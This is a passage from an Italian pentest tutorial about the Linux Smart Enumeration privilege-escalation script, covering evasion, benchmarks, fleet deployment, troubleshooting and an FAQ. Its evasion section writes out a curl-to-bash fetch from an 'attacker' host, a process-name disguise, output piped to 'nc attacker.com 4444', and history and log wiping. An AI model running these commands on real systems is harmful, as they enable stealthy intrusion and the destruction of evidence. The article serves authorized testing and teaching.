**Ruolo di LSE:** In questa chain, LSE è stato cruciale in 2 momenti:

1. Trovato `.ssh` writable → lateral movement
2. Trovato `sudo docker` NOPASSWD → root access

Senza LSE, avresti dovuto fare enumeration manuale per ore. LSE ha ridotto il tempo da "ore" a "minuti".

***

## 8️⃣ Detection & Evasion

### Cosa monitora il Blue Team

**Process monitoring**

```bash
# EDR/SIEM cerca pattern tipo:
# process_name = bash
# command_line CONTAINS "lse" OR "smart" OR "enumeration"
# parent_process = www-data OR apache2
```

**Log entries generati da LSE:**

```bash
# /var/log/auth.log
Feb 05 15:34:21 webserver sudo[23456]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ls /root

# /var/log/syslog  
Feb 05 15:34:22 webserver kernel: [23456.789] audit: LSE enumeration detected: Multiple rapid file access attempts
```

**File system monitoring:**

```bash
# auditd rule tipica
-w /tmp -p wa -k temp_file_write
-w /etc/passwd -p r -k sensitive_file_read
-w /etc/shadow -p r -k sensitive_file_read

# LSE triggera questi quando:
# - Scarica in /tmp
# - Legge /etc/passwd per user enum
# - Tenta leggere /etc/shadow (anche se failed)
```

🎓 **Perché queste detection?** Blue Team cerca "anomalies": un processo web (apache) che esegue bash script è anomalo. File access rapido a 50+ file in 30 secondi è anomalo. LSE fa entrambi.

***

### Tecniche di evasion

**1. In-memory execution (no disk write)**

```bash
# Standard (leaves lse.sh on disk)
wget http://attacker/lse.sh
./lse.sh

# Stealth (in-memory only)
curl -s http://attacker/lse.sh | bash
```

**Pro:** Nessun file in `/tmp` da rilevare. Forensic difficile (no artifact su disco).

**Contro:** Processo `bash` comunque visibile in `ps`. Network connection verso IP esterno più sospetta.

***

**2. Nome file innocuo + process hiding**

```bash
# Download con nome sistema-looking
curl -s http://attacker/lse.sh -o /tmp/.system-check
chmod +x /tmp/.system-check

# Execution con argv spoofing
cp /bin/bash /tmp/.bash
echo 'exec /tmp/.system-check "$@"' > /tmp/.systemd-udevd
chmod +x /tmp/.systemd-udevd
/tmp/.systemd-udevd

# In ps appare come: .systemd-udevd invece di lse.sh
```

***

**3. Rate limiting (slow execution)**

LSE level 2 fa \~200 syscall in 90 secondi. EDR cerca "burst". Rallenta l'esecuzione:

```bash
# Split in chunks con delay
./lse.sh -s fst -l 1 > part1.txt
sleep 300  # 5 minuti pause

./lse.sh -s sud -l 1 > part2.txt
sleep 300

./lse.sh -s sof -l 1 > part3.txt
```

**Rationale:** Detection threshold tipico è "100+ file read/min". Rallentando, rimani sotto soglia.

***

**4. Output redirection a remote listener**

```bash
# Output locale = file in /tmp = rilevabile
./lse.sh > output.txt

# Output remoto = nessun file locale
./lse.sh | nc attacker.com 4444

# Sulla tua macchina
nc -lvnp 4444 > lse_output.txt
```

**Pro:** Zero artifact sul target. Nessun file da cleanup.

**Contro:** Network traffic anomalo (outbound su porta high).

***

### Post-enumeration cleanup

**Rimozione file:**

```bash
# Rimuovi script
rm -f /tmp/lse.sh /tmp/.system-check

# Rimuovi output files
rm -f /tmp/lse_*.txt /tmp/output.txt

# Clear bash history
history | grep "lse\|wget.*lse\|curl.*lse" | cut -d' ' -f1 | while read num; do history -d $num; done

# Nuclear option (molto sospetto!)
cat /dev/null > ~/.bash_history
history -c
```

**Log sanitization (solo con root):**

```bash
# Rimuovi entry specifiche
sed -i '/lse/Id' /var/log/syslog
sed -i '/lse/Id' /var/log/auth.log

# Clear systemd journal
journalctl --vacuum-time=1s
```

⚠️ **WARNING ETICO:** Log tampering è **illegale** senza autorizzazione esplicita. In un pentest:

* Documenta ogni file creato/modificato
* Non modificare log senza permesso scritto nel SOW
* Cleanup deve essere concordato con cliente

**Timeline cleanup:** 1-2 minuti

***

## 9️⃣ Performance & Scaling

### Benchmark per livello

Test su Ubuntu 20.04 (2 CPU, 4GB RAM, SSD):

| **Level** | **Execution Time** | **CPU Peak** | **Memory Peak** | **Tests Run** |
| --------- | ------------------ | ------------ | --------------- | ------------- |
| **0**     | 18s                | 8%           | 38MB            | 45 tests      |
| **1**     | 39s                | 12%          | 52MB            | 120 tests     |
| **2**     | 87s                | 18%          | 68MB            | 200+ tests    |

**Bottleneck:** I/O su filesystem. Su HDD meccanico, time raddoppia. Su NFS, triplica.

***

### Multi-target deployment

**Scenario:** Audit su 50 server Linux in enterprise network.

**Approccio: Parallel SSH with GNU parallel**

```bash
#!/bin/bash
# parallel_lse.sh

parallel -j 10 --timeout 120 \
  'ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 admin@{} "curl -s http://internal-repo/lse.sh | bash -s -- -i -l 1" > results/lse_{}.txt 2>&1' \
  :::: servers.txt

echo "Completed. Results in results/"
```

**Timeline:** \~5 minuti per 50 server (10 concurrent)

**Ansible playbook (automation framework):**

```yaml
---
- hosts: linux_fleet
  gather_facts: no
  tasks:
    - name: Execute LSE
      shell: curl -s http://internal-repo/lse.sh | bash -s -- -i -l 1
      register: lse_output
      
    - name: Save results locally
      local_action:
        module: copy
        content: "{{ lse_output.stdout }}"
        dest: "./results/lse_{{ inventory_hostname }}.txt"
```

```bash
ansible-playbook -i inventory lse_playbook.yml
```

**Timeline:** \~3 minuti per 50 server (Ansible gestisce parallelismo automaticamente)

***

### Optimization per low-resource targets

**Problema:** Target con 256MB RAM, CPU 400MHz (embedded device, IoT).

**Soluzione:**

```bash
# Level 0 only (minimal resource usage)
./lse.sh -l 0

# O selection specifica
./lse.sh -s sud,fst -l 0

# Redirect output per liberare buffer
./lse.sh -l 0 > /dev/null  # Process remotely
```

**Risultati:**

* Memory usage: 68MB → 38MB
* Execution time su low-resource: 87s → 25s
* CPU sustained: 18% → 6%

***

## 10️⃣ Tabelle Tecniche

### Command Reference

| **Comando**               | **Funzione**      | **Use Case**               |
| ------------------------- | ----------------- | -------------------------- |
| `./lse.sh`                | Default (level 0) | Quick enumeration          |
| `./lse.sh -l 1`           | Medium verbosity  | Standard pentest           |
| `./lse.sh -l 2`           | Full verbosity    | Forensic audit             |
| `./lse.sh -s sud`         | Only sudo tests   | Focus enumeration          |
| `./lse.sh -s fst,sud,ctn` | Multi-category    | Custom selection           |
| `./lse.sh -i`             | Non-interactive   | Automated scripts          |
| `./lse.sh -c`             | Force colors      | Output to file with colors |
| `curl URL \| bash`        | In-memory exec    | Maximum stealth            |
| `./lse.sh \| tee out.txt` | Save + display    | Interactive analysis       |

***

### Test Category Reference

| **Code** | **Category** | **Cosa controlla**              | **Exploitation examples**  |
| -------- | ------------ | ------------------------------- | -------------------------- |
| **fst**  | File System  | SUID, writable files, configs   | Path hijacking, cron abuse |
| **sud**  | Sudo Config  | NOPASSWD, sudo -l               | GTFOBins sudo abuse        |
| **sof**  | Software     | Versions, kernel, packages      | CVE exploitation           |
| **pro**  | Processes    | Cron, services, running as root | Process injection          |
| **net**  | Network      | Open ports, connections         | Internal pivoting          |
| **ctn**  | Containers   | Docker, LXC, capabilities       | Container escape           |
| **sec**  | Security     | AppArmor, SELinux, firewall     | Bypass techniques          |

***

### Level Comparison Matrix

| **Feature**         | **Level 0**         | **Level 1**           | **Level 2**              |
| ------------------- | ------------------- | --------------------- | ------------------------ |
| **SUID binaries**   | Only uncommon       | All SUID              | All + modification dates |
| **Writable files**  | Critical paths only | Extended paths        | Complete scan /home /var |
| **Sudo checks**     | NOPASSWD only       | All sudo capabilities | + sudo version CVE check |
| **Cron jobs**       | System crontab      | + User crontabs       | + Recently modified      |
| **Software**        | Vulnerable versions | All installed         | + Development tools      |
| **Network**         | Listening services  | + Active connections  | + Routing, DNS config    |
| **False positives** | Very low            | Low                   | Medium                   |
| **Execution time**  | \~20s               | \~40s                 | \~90s                    |
| **Best for**        | CTF, quick wins     | Standard pentest      | Complete audit           |

***

### LSE vs Competitors

| **Feature**                  | **LSE**                    | **LinPEAS**                 | **LinEnum**         | **pspy**      |
| ---------------------------- | -------------------------- | --------------------------- | ------------------- | ------------- |
| **Severity sorting**         | ✅ Levels 0-2               | ⚠️ Color-based              | ❌ No sorting        | N/A           |
| **Learning curve**           | 🟢 Easy (levels guide you) | 🟡 Medium                   | 🟡 Medium           | 🔴 Advanced   |
| **Container-specific**       | ✅ Dedicated CTN tests      | ⚠️ Generic container checks | ❌ No specific tests | ❌ N/A         |
| **Customization**            | ✅ Selection mode `-s`      | ⚠️ Limited                  | ❌ Run all           | N/A           |
| **Output verbosity control** | ✅ 3 levels                 | ❌ Single output             | ❌ Single output     | ⚠️ Time-based |
| **False positive rate**      | 🟢 Low (smart filters)     | 🟡 Medium                   | 🟢 Low              | 🟢 None       |
| **Best for beginners**       | ✅ Yes (guided approach)    | ⚠️ Overwhelming             | ⚠️ Raw data         | ❌ No          |

**Decision guide:**

Choose **LSE** when:

* 🎓 Learning privilege escalation
* ⏱️ Time-limited engagement
* 🐳 Working with containers
* 🎯 Want focused results, not data dump
* 📊 Need severity-based prioritization

Choose **LinPEAS** when:

* 🔍 Need comprehensive CVE matching
* 🎨 Want colorful output with links
* ⚡ Speed not critical

Choose **LinEnum** when:

* 📄 Want raw data for manual analysis
* 💾 Low-resource target
* 🎓 Learning Linux internals

***

## 11️⃣ Troubleshooting

### Error: "bash: ./lse.sh: /bin/bash: bad interpreter"

**Causa:** Script ha Windows line endings (CRLF) invece di Unix (LF).

**Fix:**

```bash
# Verifica
file lse.sh
# lse.sh: Bourne-Again shell script, ASCII text executable, with CRLF line terminators

# Converti
dos2unix lse.sh

# Se dos2unix non disponibile
sed -i 's/\r$//' lse.sh

# Oppure
tr -d '\r' < lse.sh > lse_fixed.sh
mv lse_fixed.sh lse.sh
chmod +x lse.sh
```

***

### Output shows "Permission denied" on many tests

**Causa:** Stai eseguendo come unprivileged user. LSE cerca di leggere file sensibili (`/etc/shadow`, `/root/*`) che richiedono root.

**È normale!** LSE funziona anche senza root. Ignora gli errori "Permission denied", focus sui `[!]` che trova.

**Optional: Se hai sudo parziale**

```bash
# Prova con sudo (se disponibile)
sudo ./lse.sh -l 1

# LSE con sudo ha più visibilità
```

***

### LSE runs extremely slow (>5 minutes)

**Causa 1:** Level 2 su filesystem enorme.

```bash
# Verifica livello
echo "Current level: check if you used -l 2"

# Usa level 0 o 1
./lse.sh -l 1  # Should complete in <1 min
```

**Causa 2:** NFS o network-mounted filesystem.

```bash
# Check mounts
mount | grep nfs
# /home on nfs-server:/export/home type nfs

# LSE fa molti file stat(), lento su NFS
# Workaround: skip filesystem-intensive tests
./lse.sh -s sud,sof,pro -l 1  # Skip fst (filesystem) category
```

***

### No output or only header shown

**Causa:** Shell incompatibility (dash/ash invece di bash).

```bash
# Verifica shell
readlink /proc/$$/exe
# /bin/dash  ← Problema

# Forza bash
bash ./lse.sh

# Se bash non in PATH
/usr/bin/bash ./lse.sh

# Se bash proprio non esiste
which bash
# (no output) ← bash not installed

# Fallback: usa LinEnum (sh-compatible) invece di LSE
```

***

### "curl: command not found" durante in-memory execution

**Causa:** Sistema minimale senza network tools.

**Fix con netcat:**

```bash
# Attacker machine
nc -lvnp 8888 < lse.sh

# Target
nc attacker.com 8888 > lse.sh
chmod +x lse.sh
./lse.sh
```

**Fix con base64:**

```bash
# Attacker
base64 lse.sh  # Copy output

# Target
cat << 'EOF' | base64 -d > lse.sh
[paste base64]
EOF
chmod +x lse.sh
```

***

### Colors not working in output

**Causa:** TERM variable non settata o terminal non supporta ANSI colors.

```bash
# Verifica
echo $TERM
# dumb  ← No color support

# Fix: Export corretto TERM
export TERM=xterm-256color

# Oppure forza colors
./lse.sh -c
```

Per output a file con colori intatti:

```bash
./lse.sh -c | tee output.txt
```

***

## 12️⃣ FAQ

**Q: LSE è meglio di LinPEAS per imparare privilege escalation?**

A: Sì, per principianti LSE è migliore. Il sistema a livelli (0→1→2) ti guida progressivamente. Level 0 mostra solo "quick wins", perfetto per capire i vettori più comuni. LinPEAS ti sommerge di 500+ linee di output colorato che può confondere se non sai cosa cercare. LSE ti dice "guarda qui" con priorità chiara.

***

**Q: Posso usare LSE in container Docker?**

A: Sì, LSE ha test specifici per container (categoria `ctn`). Rileva:

* Docker socket esposto
* Mounted host filesystem
* Privileged container
* Capabilities speciali

Per focus su container:

```bash
./lse.sh -s ctn -l 2
```

Questo è un vantaggio di LSE rispetto a LinEnum/LinPEAS che hanno generic container checks.

***

**Q: Come faccio a capire cosa significano i codici tipo fst000, sud010?**

A: Il codice identifica il test:

* **Prime 3 lettere** = Categoria (fst=filesystem, sud=sudo, ctn=container, etc.)
* **Numeri** = Test ID all'interno della categoria

Esempio: `sud000` = "Sudo test numero 000" (il più importante della categoria sudo)

Puoi vedere tutti i test disponibili nel source code di LSE su GitHub, ma non serve memorizzarli. Focus sui `[!]` (vulnerabilità trovate).

***

**Q: LSE può danneggiare il sistema?**

A: No. LSE fa solo **enumeration** (lettura). Non modifica file, non installa nulla, non cambia configurazioni. Può:

* Consumare CPU temporaneamente (10-20%)
* Generare log entries (rilevabile da SIEM)
* In sistemi molto vecchi con poca RAM, potrebbe causare slow-down temporaneo

Ma non danno permanente. È safe da usare anche in production (con autorizzazione del cliente ovviamente).

***

**Q: Posso modificare LSE per aggiungere i miei test custom?**

A: Sì! LSE è bash script open source. Puoi:

1. Aggiungere nuovi test nella categoria esistente
2. Creare nuova categoria custom
3. Modificare threshold dei test esistenti

Esempio: aggiungere check per software specifico della tua company.

```bash
# Edit lse.sh
# Cerca la sezione "Software tests" (sof)
# Aggiungi il tuo test seguendo il formato esistente
```

LSE usa funzioni bash standard, facile da customizzare per chi sa bash.

***

**Q: LSE funziona su sistemi BSD (FreeBSD, OpenBSD)?**

A: No ufficialmente. LSE è designed per Linux. Molti comandi (come `ps`, `find`) hanno sintassi diversa su BSD. Alcuni check potrebbero funzionare, ma non è garantito. Per BSD usa tool specifici come [bsd-privesc-check](https://hackita.it/articoli/bsd-enumeration-tools).

***

**Q: Quanto spesso viene aggiornato LSE?**

A: LSE ha development attivo su GitHub (diego-treitos repository). Update tipicamente ogni 3-6 mesi con nuovi test e fix. Controlla release page per ultima versione. A differenza di LinPEAS (update frequenti), LSE è più stabile e maturo.

Per update:

```bash
cd linux-smart-enumeration
git pull origin master
```

***

**Q: È legale usare LSE su sistemi aziendali?**

A: **Solo con autorizzazione scritta.** LSE è penetration testing tool. Uso non autorizzato è illegale (Computer Fraud and Abuse Act US, Computer Misuse Act UK, direttiva NIS2 EU). Devi avere:

* Contratto di pentest firmato
* Scope definito (quali sistemi puoi testare)
* Rules of Engagement (cosa puoi/non puoi fare)

Anche se lavori per l'azienda, chiedi permesso al team security prima di eseguire security tools sui loro sistemi.

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**                       | **Comando LSE**                                       |
| ---------------------------------- | ----------------------------------------------------- |
| **First time user (principiante)** | `./lse.sh`                                            |
| **CTF quick enumeration**          | `./lse.sh -l 0`                                       |
| **Standard pentest**               | `./lse.sh -l 1 \| tee lse_output.txt`                 |
| **Complete audit**                 | `./lse.sh -l 2`                                       |
| **Container-only checks**          | `./lse.sh -s ctn -l 2`                                |
| **Sudo focus**                     | `./lse.sh -s sud -l 1`                                |
| **Stealth in-memory**              | `curl -s http://attacker/lse.sh \| bash`              |
| **Output to remote listener**      | `./lse.sh \| nc attacker.com 4444`                    |
| **Non-interactive (automation)**   | `./lse.sh -i -l 1`                                    |
| **Multi-host parallel**            | `parallel ssh {} 'curl URL \| bash' :::: servers.txt` |
| **Extract only vulnerabilities**   | `./lse.sh \| grep "^\[!\]"`                           |
| **Low-resource target**            | `./lse.sh -l 0 -s sud,fst`                            |

***

## Disclaimer

LSE (Linux Smart Enumeration) è uno strumento per **penetration testing autorizzato**, **security audit**, e **ricerca in sicurezza informatica**. L'uso senza autorizzazione esplicita scritta del proprietario del sistema è illegale in tutte le giurisdizioni.

Utilizza LSE esclusivamente in:

* Ambienti di laboratorio controllati (VM, CTF platforms, HackTheBox, TryHackMe)
* Sistemi di tua proprietà
* Engagement di penetration testing con contratto firmato e scope ben definito

L'autore di questo articolo e HackIta declinano ogni responsabilità per usi impropri, illegali, o danni causati dall'uso di questo tool.

**Repository ufficiale:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

**Documentazione completa:** Consulta il README sul repository per dettagli tecnici approfonditi.

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
